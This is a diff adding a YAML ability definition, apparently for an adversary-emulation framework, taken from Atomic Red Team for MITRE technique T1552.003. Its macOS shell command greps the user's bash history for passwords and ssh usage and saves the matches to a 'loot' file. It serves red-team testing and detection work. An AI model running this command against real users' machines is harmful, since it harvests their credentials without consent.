@@ -1,0 +1,38 @@
+- id: 3cfde62b-7c33-4b26-a61e-755d6131c8ce
+  name: Search Through Bash History
+  description: Search through bash history for specifice commands we want to capture
+  tactic: credential-access
+  technique:
+    attack_id: T1552.003
+    name: 'Unsecured Credentials: Bash History'
+  platforms:
+    darwin:
+      sh:
+        command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1552.003
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_file:
+        description: Path where captured results will be placed
+        type: path
+        default: ~/loot.txt
+      bash_history_grep_args:
+        description: grep arguments that filter out specific commands we want to capture
+        type: path
+        default: -e '-p ' -e 'pass' -e 'ssh'
+      bash_history_filename:
+        description: Path of the bash history file to capture
+        type: path
+        default: ~/.bash_history
+    technique_created: '2020-02-04T13:02:11.685Z'
+    atomic_guid: 3cfde62b-7c33-4b26-a61e-755d6131c8ce
+    import_timestamp: '2025-06-24T11:14:07.683504Z'
